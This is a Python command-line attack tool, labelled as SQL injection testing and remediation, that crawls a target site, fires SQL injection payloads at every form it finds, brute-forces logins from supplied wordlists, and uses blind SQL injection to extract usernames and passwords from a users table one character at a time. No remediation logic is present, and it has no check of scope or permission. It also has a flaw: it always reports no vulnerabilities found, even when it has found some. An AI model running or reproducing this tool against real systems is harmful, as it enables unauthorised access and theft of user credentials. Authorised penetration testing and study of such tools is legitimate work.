import argparse
import requests
import urllib.parse
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from collections import deque
import os

# Common SQL injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    '" OR "1"="1',
    "' OR 1=1-- ",
    '" OR 1=1-- ',
    "' OR 'a'='a",
    '" OR "a"="a',
    "' OR ''='",
    '" OR ""="',
    "'--",
    '"--',
]

def test_sqli(url, params, method="GET", results=None):
    print("\n[+] Starting SQL Injection tests...")
    vulnerable = False
    param_pairs = [p for p in params.split('&') if '=' in p]
    # Get baseline response for comparison
    baseline_params = {p.split('=')[0]: p.split('=')[1] for p in param_pairs}
    if method.upper() == "POST":
        baseline_resp = requests.post(url, data=baseline_params, timeout=5)
    else:
        baseline_resp = requests.get(url, params=baseline_params, timeout=5)
    baseline_text = baseline_resp.text
    found_vulns = []
    for i, pair in enumerate(param_pairs):
        k, v = pair.split('=', 1)
        for payload in SQLI_PAYLOADS:
            test_params = {p.split('=')[0]: p.split('=')[1] for p in param_pairs}
            test_params[k] = v + payload
            try:
                if method.upper() == "POST":
                    resp = requests.post(url, data=test_params, timeout=5)
                else:
                    resp = requests.get(url, params=test_params, timeout=5)
                if is_sqli_response(resp.text):
                    found_vulns.append(f"{k} with payload: {payload} (SQL error detected)")
                elif resp.text != baseline_text:
                    found_vulns.append(f"{k} with payload: {payload} (response changed)")
                if "Login successful!" in resp.text and "Login successful!" not in baseline_text:
                    found_vulns.append(f"[!!!] Authentication bypassed using {k} with payload: {payload}")
            except Exception as e:
                pass
    if results is not None:
        results['sqli'] = found_vulns
    if not vulnerable:
        print("[-] No SQL injection vulnerabilities detected with basic payloads.")

def is_sqli_response(response_text):
    # Basic error-based detection (can be expanded)
    errors = [
        'You have an error in your SQL syntax',
        'Warning: mysql_',
        'Unclosed quotation mark',
        'quoted string not properly terminated',
        'SQLSTATE',
    ]
    for error in errors:
        if error.lower() in response_text.lower():
            return True
    return False

def brute_force_login(url, form_params, method="POST", success_indicator="Login successful!", results=None, user_file=None, pass_file=None):
    print("\n[+] Starting brute-force credential testing...")
    username_field = None
    password_field = None
    for pair in form_params.split('&'):
        if '=' in pair:
            k, _ = pair.split('=', 1)
            if 'user' in k.lower():
                username_field = k
            if 'pass' in k.lower():
                password_field = k
    if not username_field or not password_field:
        print("[!] Could not identify username/password fields for brute-force.")
        return
    # Require usernames and passwords from files only
    if not user_file or not os.path.exists(user_file):
        print("[!] Username list file (--userlist) is required for brute-force and was not found.")
        return
    if not pass_file or not os.path.exists(pass_file):
        print("[!] Password list file (--passlist) is required for brute-force and was not found.")
        return
    with open(user_file, 'r', encoding='utf-8') as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(pass_file, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]
    found_creds = []
    for username in usernames:
        for password in passwords:
            params = {username_field: username, password_field: password}
            try:
                if method.upper() == "POST":
                    resp = requests.post(url, data=params, timeout=5)
                else:
                    resp = requests.get(url, params=params, timeout=5)
                if success_indicator.lower() in resp.text.lower():
                    found_creds.append(f"{username_field}='{username}', {password_field}='{password}'")
                    if results is not None:
                        results['creds'] = found_creds
                    return
            except Exception as e:
                print(f"[!] Error testing {username}/{password}: {e}")
    if results is not None:
        results['creds'] = found_creds
    print("[-] No valid credentials found with provided username/password lists.")

def blind_sqli_extract(url, form_params, method="POST", success_indicator="Login successful!", max_length=20, max_users=5, results=None):
    print("\n[+] Starting blind SQLi extraction (fresh crack, multi-user)...")
    username_field = None
    password_field = None
    for pair in form_params.split('&'):
        if '=' in pair:
            k, _ = pair.split('=', 1)
            if 'user' in k.lower():
                username_field = k
            if 'pass' in k.lower():
                password_field = k
    if not username_field or not password_field:
        print("[!] Could not identify username/password fields for blind SQLi.")
        return
    extracted_creds = []
    for user_idx in range(max_users):
        extracted_username = ''
        extracted_password = ''
        # Extract username character by character
        print(f"[+] Extracting username for user #{user_idx+1} via blind SQLi...")
        for i in range(1, max_length+1):
            found = False
            for c in range(32, 127):  # Printable ASCII
                payload = f"' OR substr((SELECT username FROM users LIMIT 1 OFFSET {user_idx}),{i},1)='{chr(c)}'--"
                params = {username_field: payload, password_field: 'test'}
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=params, timeout=5)
                    else:
                        resp = requests.get(url, params=params, timeout=5)
                    if success_indicator.lower() in resp.text.lower():
                        extracted_username += chr(c)
                        print(f"[+] Username so far: {extracted_username}")
                        found = True
                        break
                except Exception as e:
                    print(f"[!] Error during blind SQLi username extraction: {e}")
            if not found:
                break
        if not extracted_username:
            break  # No more users
        print(f"[+] Extracted username: {extracted_username}")
        # Extract password character by character
        print(f"[+] Extracting password for user #{user_idx+1} via blind SQLi...")
        for i in range(1, max_length+1):
            found = False
            for c in range(32, 127):
                payload = f"' OR substr((SELECT password FROM users LIMIT 1 OFFSET {user_idx}),{i},1)='{chr(c)}'--"
                params = {username_field: extracted_username, password_field: payload}
                try:
                    if method.upper() == "POST":
                        resp = requests.post(url, data=params, timeout=5)
                    else:
                        resp = requests.get(url, params=params, timeout=5)
                    if success_indicator.lower() in resp.text.lower():
                        extracted_password += chr(c)
                        print(f"[+] Password so far: {extracted_password}")
                        found = True
                        break
                except Exception as e:
                    print(f"[!] Error during blind SQLi password extraction: {e}")
            if not found:
                break
        print(f"[+] Extracted password: {extracted_password}")
        extracted_creds.append(f"{username_field}='{extracted_username}', {password_field}='{extracted_password}'")
    if results is not None:
        results['creds'] = extracted_creds

def auto_test_forms(url, crack_lists=False, fresh_crack=False, results=None, user_file=None, pass_file=None):
    print(f"[+] Fetching {url} and searching for forms...")
    try:
        resp = requests.get(url, timeout=5)
        soup = BeautifulSoup(resp.text, 'html.parser')
        forms = soup.find_all('form')
        if not forms:
            print("[-] No forms found on the page.")
            return
        page_results = []
        for idx, form in enumerate(forms, 1):
            action = form.get('action')
            method = form.get('method', 'get').upper()
            inputs = form.find_all('input')
            params = []
            for inp in inputs:
                name = inp.get('name')
                if name:
                    params.append(f"{name}=test")
            param_str = '&'.join(params)
            form_url = requests.compat.urljoin(url, action) if action else url
            print(f"\n[+] Testing form #{idx}: {form_url} [{method}] with params: {param_str}")
            form_result = {'url': form_url, 'sqli': [], 'creds': []}
            test_sqli(form_url, param_str, method, results=form_result)
            if crack_lists:
                brute_force_login(form_url, param_str, method, results=form_result, user_file=user_file, pass_file=pass_file)
            elif fresh_crack:
                blind_sqli_extract(form_url, param_str, method, results=form_result)
            page_results.append(form_result)
        if results is not None:
            results['pages'] = page_results
    except Exception as e:
        print(f"[!] Error fetching or parsing forms: {e}")

def crawl_and_test(start_url, max_pages=10, crack_lists=False, fresh_crack=False, results=None, skip_urls=None, user_file=None, pass_file=None):
    print(f"[+] Starting crawl from {start_url}")
    visited = set() if skip_urls is None else set(skip_urls)
    queue = deque([start_url])
    pages_tested = 0
    crawl_results = []
    while queue and pages_tested < max_pages:
        url = queue.popleft()
        url_norm = url.rstrip('/')
        if url_norm in visited:
            continue
        visited.add(url_norm)
        try:
            resp = requests.get(url, timeout=5)
            soup = BeautifulSoup(resp.text, 'html.parser')
            print(f"\n[+] Crawling and testing: {url}")
            page_result = {}
            auto_test_forms(url, crack_lists=crack_lists, fresh_crack=fresh_crack, results=page_result, user_file=user_file, pass_file=pass_file)
            crawl_results.append({'url': url, 'pages': page_result.get('pages', [])})
            pages_tested += 1
            # Find and enqueue internal links
            for link in soup.find_all('a', href=True):
                link_url = urljoin(url, link['href'])
                link_url_norm = link_url.rstrip('/')
                if urlparse(link_url).netloc == urlparse(start_url).netloc and link_url_norm not in visited:
                    queue.append(link_url)
        except Exception as e:
            print(f"[!] Error crawling {url}: {e}")
    if results is not None:
        results['crawl'] = crawl_results

def main():
    parser = argparse.ArgumentParser(
        description="SQL Injection Testing and Remediation CLI Tool"
    )
    parser.add_argument('--url', type=str, help='Target URL to test', required=True)
    parser.add_argument('--params', type=str, help='Parameters to test (e.g., "id=1")')
    parser.add_argument('--method', type=str, choices=['GET', 'POST'], default='GET', help='HTTP method to use (GET or POST)')
    parser.add_argument('--auto', action='store_true', help='Automatically find and test forms on the page (with blind SQLi by default)')
    parser.add_argument('--crawl', action='store_true', help='Crawl the site and test forms on each page')
    parser.add_argument('--max-pages', type=int, default=10, help='Maximum number of pages to crawl')
    parser.add_argument('--crack_lists', action='store_true', help='Brute-force with common username/password lists')
    parser.add_argument('--fresh_crack', action='store_true', help='Extract credentials using blind SQLi only')
    parser.add_argument('--userlist', type=str, help='File with usernames for brute-force (one per line)')
    parser.add_argument('--passlist', type=str, help='File with passwords for brute-force (one per line)')
    args = parser.parse_args()

    print(f"Testing {args.url}")
    results = {}
    tested_urls = set()
    # If both --auto and --crawl are set, avoid duplicate testing
    if args.auto and args.crawl:
        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
        tested_urls.add(args.url.rstrip('/'))
        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, skip_urls=tested_urls, user_file=args.userlist, pass_file=args.passlist)
    elif args.auto:
        auto_test_forms(args.url, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
    elif args.crawl:
        crawl_and_test(args.url, args.max_pages, crack_lists=args.crack_lists, fresh_crack=(not args.crack_lists), results=results, user_file=args.userlist, pass_file=args.passlist)
    elif args.params:
        single_result = {'url': args.url, 'sqli': [], 'creds': []}
        test_sqli(args.url, args.params, args.method, results=single_result)
        results = {'pages': [single_result]}
    else:
        print("[!] Please provide either --params, --auto, or --crawl.")
        return
    # Output summary
    print("\n========== SUMMARY ==========")
    if 'pages' in results:
        for page in results['pages']:
            print(f"\n[Page: {page['url']}]\nPossible SQLi payloads:")
            for vuln in page.get('sqli', []):
                print(f"  - {vuln}")
            print("Validated credentials:")
            for cred in page.get('creds', []):
                print(f"  - {cred}")
    if 'crawl' in results:
        for crawl_page in results['crawl']:
            print(f"\n[Crawled Page: {crawl_page['url']}]\n")
            for page in crawl_page.get('pages', []):
                print(f"  [Form: {page['url']}]\n  Possible SQLi payloads:")
                for vuln in page.get('sqli', []):
                    print(f"    - {vuln}")
                print("  Validated credentials:")
                for cred in page.get('creds', []):
                    print(f"    - {cred}")
    print("============================\n")

if __name__ == "__main__":
    main()
